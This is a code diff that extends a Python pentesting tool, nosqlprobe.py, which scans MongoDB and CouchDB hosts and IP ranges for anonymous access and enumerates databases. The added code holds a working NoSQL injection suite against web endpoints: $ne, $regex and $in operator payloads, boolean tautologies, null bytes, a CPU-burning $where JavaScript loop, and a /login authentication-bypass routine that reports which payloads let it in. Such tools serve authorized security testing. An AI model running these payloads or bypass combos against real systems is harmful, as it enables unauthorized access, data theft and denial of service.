@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & enhanced NoSQL injection tests
+nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & NoSQL injection tests
 Dependencies:
     pip3 install pymongo couchdb requests colorama validators
 """
@@ -215,24 +215,6 @@ def parse_burp_request(path):
     return method.upper(), full, hdrs, body
 
 
-def build_request_line(method, base, inj, data_json):
-    p = urlparse(base)
-    if method == 'GET':
-        qs = '&'.join(
-            f'{quote_plus(str(k))}={quote_plus(str(v))}'
-            for k, v in inj.items())
-        return f'GET {p.path}?{qs} HTTP/1.1'
-    else:
-        if data_json:
-            return (f'curl -X POST {base} '
-                    f'-H "Content-Type: application/json" '
-                    f'-d "{json.dumps(inj)}"')
-        b = '&'.join(
-            f'{quote_plus(str(k))}={quote_plus(str(v))}'
-            for k, v in inj.items())
-        return f'curl -X POST {base} -d "{b}"'
-
-
 def handle_db(args):
     creds = None
     if args.creds:
@@ -244,6 +226,7 @@ def handle_db(args):
 
     target, engine = args.target, args.engine
 
+    # CIDR scan
     if '/' in target:
         if not (args.anonymous or args.check_anonymous):
             print(Fore.RED + '[!] CIDR requires --anonymous')
@@ -255,8 +238,7 @@ def handle_db(args):
             sys.exit(1)
         results = []
         for ip in map(str, net):
-            ok, ver, err = test_db_access(
-                ip, DEFAULT_PORTS[engine], engine)
+            ok, ver, err = test_db_access(ip, DEFAULT_PORTS[engine], engine)
             if ok:
                 print(Fore.GREEN + f'[+] {engine} anonymous on '
                                    f'{ip}:{DEFAULT_PORTS[engine]} (v{ver})')
@@ -275,6 +257,7 @@ def handle_db(args):
                 w.writerows(results)
         return
 
+    # Single host
     if ':' in target:
         host, ps = target.split(':', 1)
         try:
@@ -289,6 +272,7 @@ def handle_db(args):
         print(Fore.RED + '[!] Invalid host/IP')
         sys.exit(1)
 
+    # Anonymous check
     if args.anonymous or args.check_anonymous:
         ok, ver, err = test_db_access(host, port, engine)
         if ok:
@@ -303,6 +287,7 @@ def handle_db(args):
         if not args.enum:
             return
 
+    # Enumeration
     if args.enum:
         ok, ver, err = test_db_access(host, port, engine, creds)
         if not ok:
@@ -317,8 +302,7 @@ def handle_db(args):
             else:
                 csvw.writerow(['database', ''])
         if engine == 'mongodb':
-            enumerate_mongodb(host, port, creds, csvw,
-                              args.mongo_shell)
+            enumerate_mongodb(host, port, creds, csvw, args.mongo_shell)
         else:
             enumerate_couchdb(host, port, creds, csvw)
         if csvw:
@@ -329,6 +313,7 @@ def handle_web(args):
     """
     HTTPS-first: tries HTTPS, then HTTP if needed; then injection tests.
     """
+    # Load request or CLI
     if args.request:
         method, full, headers, raw_body = parse_burp_request(
             args.request)
@@ -378,25 +363,28 @@ def handle_web(args):
         return requests.post(url, data=params,
                              headers=hdrs, timeout=15)
 
+    # Build base + host
     p = urlparse(base)
     netloc = p.netloc or p.path
     path = p.path if p.netloc else ''
 
-    def make_url(s):
-        return urlunparse((s, netloc, path, '', '', ''))
+    def make_url(scheme):
+        return urlunparse((scheme, netloc, path, '', '', ''))
 
+    # HTTPS-first, then HTTP
     br = None
     for sch in ('https', 'http'):
-        url_try = make_url(sch)
+        trial = make_url(sch)
         try:
-            br = send(method, url_try,
+            br = send(method, trial,
                       orig, jb if data_json else None,
                       headers)
             if sch == 'http' and br.status_code == 400 \
                and 'not accessible over HTTP' in br.text:
                 br = None
                 continue
-            print(Fore.YELLOW + f'[*] Baseline via {sch.upper()}: {url_try}')
+            print(Fore.YELLOW + f'[*] Baseline via {sch.upper()}: {trial}')
+            base = trial
             break
         except Exception as e:
             print(Fore.YELLOW +
@@ -412,9 +400,167 @@ def handle_web(args):
     print(Fore.GREEN +
           f'[+] Baseline: {br.status_code} {br.reason}, len={blen}')
 
-    # Injection tests (as in earlier version)…
+    # Injection tests
+    tests = [
+        ('$ne', 'operator $ne', lambda v: v),
+        ('$regex', 'operator $regex', lambda _: '^.*$'),
+        ('$in', 'operator $in',
+         lambda _: ['admin', 'administrator', 'superadmin']),
+        ('syntax', 'syntax fuzz',
+         lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
+        ('false', 'boolean FALSE', lambda _: "' && 0 && 'x"),
+        ('true', 'boolean TRUE', lambda _: "' && 1 && 'x"),
+        ('or', 'boolean OR', lambda _: "'||1||'"),
+        ('null', 'null byte', lambda v: v + '\x00'),
+        ('$where', 'nested $where',
+         lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
+        ('toplevel', 'top-level $where',
+         lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
+    ]
+    found = []
+    items = (jb.items() if data_json else orig.items())
 
-    # Summary or injections follow here…
+    for op, label, fn in tests:
+        print('\n' + Fore.YELLOW + f'[*] Testing {label}')
+        for k, v in items:
+            p_params, p_body = None, None
+
+            # build payload
+            if op in ('$ne', '$regex', '$in', '$where'):
+                if data_json:
+                    p_body = jb.copy()
+                    if op == '$in':
+                        p_body[k] = {'$in': fn(v)}
+                    else:
+                        p_body[k] = {op: fn(v)}
+                else:
+                    if method == 'GET':
+                        p_params = orig.copy()
+                        if op == '$in':
+                            p_params[f'{k}[$in]'] = ','.join(fn(v))
+                        elif op == '$where':
+                            p_params[k] = fn(v)
+                        else:
+                            p_params[f'{k}[{op}]'] = (
+                                v if op == '$ne' else fn(v)
+                            )
+                    else:
+                        if op == '$in':
+                            p_params = {f'{k}[$in]': ','.join(fn(v))}
+                        else:
+                            p_params = {f'{k}[{op}]': (
+                                v if op == '$ne' else fn(v)
+                            )}
+            elif op == 'toplevel':
+                if data_json:
+                    p_body = jb.copy()
+                    p_body['$where'] = fn(v)
+                else:
+                    if method == 'GET':
+                        p_params = orig.copy()
+                        p_params['$where'] = fn(v)
+                    else:
+                        p_params = {'$where': fn(v)}
+            else:
+                pl = fn(v)
+                if data_json:
+                    continue
+                if method == 'GET':
+                    p_params = orig.copy()
+                    p_params[k] = pl
+                else:
+                    p_params = {k: pl}
+
+            # send
+            try:
+                if method == 'GET':
+                    r = requests.get(base, params=p_params,
+                                     headers=headers, timeout=20)
+                elif p_body is not None:
+                    r = requests.post(base, json=p_body,
+                                      headers=headers, timeout=20)
+                else:
+                    r = requests.post(base, data=p_params,
+                                      headers=headers, timeout=20)
+            except Exception as e:
+                print(Fore.RED + f'    [!] {k} error: {e}')
+                continue
+
+            # analyze
+            delta = abs(len(r.text) - blen)
+            vuln = (delta > 0) or (op == '$ne' and r.status_code >= 400)
+            if vuln:
+                req = r.request
+                print(Fore.GREEN +
+                      f'  [+] {k} ({label}) Δ={delta} status={r.status_code}')
+                print(Fore.GREEN + '      --- HTTP REQUEST ---')
+                ln = req.path_url if req.body is None else req.url
+                print(f'      {req.method} {ln} HTTP/1.1')
+                for hk, hv in req.headers.items():
+                    print(f'      {hk}: {hv}')
+                if req.body:
+                    btxt = (req.body.decode()
+                            if isinstance(req.body, bytes) else str(req.body))
+                    for line in btxt.splitlines():
+                        print(f'      {line}')
+                print(Fore.GREEN + '      --- HTTP RESPONSE ---')
+                print(f'      HTTP/1.1 {r.status_code} {r.reason}')
+                for rk, rv in r.headers.items():
+                    print(f'      {rk}: {rv}')
+                for line in r.text.splitlines():
+                    print(f'      {line}')
+                found.append((k, label,
+                              p_body if p_body is not None else p_params,
+                              r.status_code))
+            else:
+                print(f'  [-] {k} Δ={delta} status={r.status_code}')
+
+    # Auth bypass on /login
+    path = urlparse(base).path.lower()
+    if method == 'POST' and path.endswith('/login'):
+        print('\n' + Fore.YELLOW + '[*] Testing auth-bypass combos')
+        user0 = jb.get('username') if data_json else orig.get('username', '')
+        combos = [
+            ('user $ne', {'username': {'$ne': ''}}),
+            ('user regex', {'username': {'$regex': user0 + '.*'}}),
+            ('both $ne', {'username': {'$ne': ''},
+                          'password': {'$ne': ''}}),
+            ('admin regex + $ne pw', {
+                'username': {'$regex': 'admin.*'},
+                'password': {'$ne': ''}
+            })
+        ]
+        for label, payload in combos:
+            print(Fore.YELLOW + f'  [*] {label}')
+            if data_json:
+                body = jb.copy(); body.update(payload)
+                resp = requests.post(base, json=body,
+                                     headers=headers, timeout=20)
+            else:
+                params = orig.copy()
+                for fld, val in payload.items():
+                    params.pop(fld, None)
+                    if isinstance(val, dict):
+                        for op, opv in val.items():
+                            params[f'{fld}[{op}]'] = opv
+                    else:
+                        params[fld] = val
+                resp = requests.post(base, data=params,
+                                     headers=headers, timeout=20)
+            ok = (resp.status_code in (200, 302)) and ('Invalid' not in resp.text)
+            print(Fore.GREEN + f'    -> status={resp.status_code}, bypass={"yes" if ok else "no"}')
+            if ok:
+                print(Fore.GREEN + f'      Payload: {json.dumps(payload)}')
+
+    # Summary
+    if found:
+        print('\n' + Fore.GREEN + '[+] Injection points:')
+        for p, l, pay, st in found:
+            print(f'    - Param: {p}, Type: {l}, Status: {st}')
+            print(f'      Payload: {pay}')
+    else:
+        print('\n' + Fore.RED + '[-] No injections detected')
+
 
 def main():
     args = parse_args()
